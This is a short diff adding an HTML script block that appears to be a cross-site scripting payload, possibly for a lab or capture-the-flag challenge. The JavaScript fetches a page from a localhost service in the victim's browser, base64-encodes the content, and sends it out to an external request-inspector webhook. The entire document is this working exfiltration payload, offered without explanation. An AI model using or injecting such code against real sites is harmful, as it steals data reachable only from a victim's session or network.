@@ -1,0 +1,14 @@
+<script>
+
+async function fetchPostViews() {
+    const url = `http://localhost:1337/posts`;
+      const response = await fetch(url);
+      const text = await response.text();
+      const encodedText = btoa(text);
+      const webhookURL = 'https://requestinspector.com/inspect/01h6khadd4zy7et2yqdmsdcw48'; 
+      const webhookParams = `?data=${encodeURIComponent(encodedText)}`;
+      await fetch(webhookURL + webhookParams); 
+  }
+  fetchPostViews();
+
+</script>
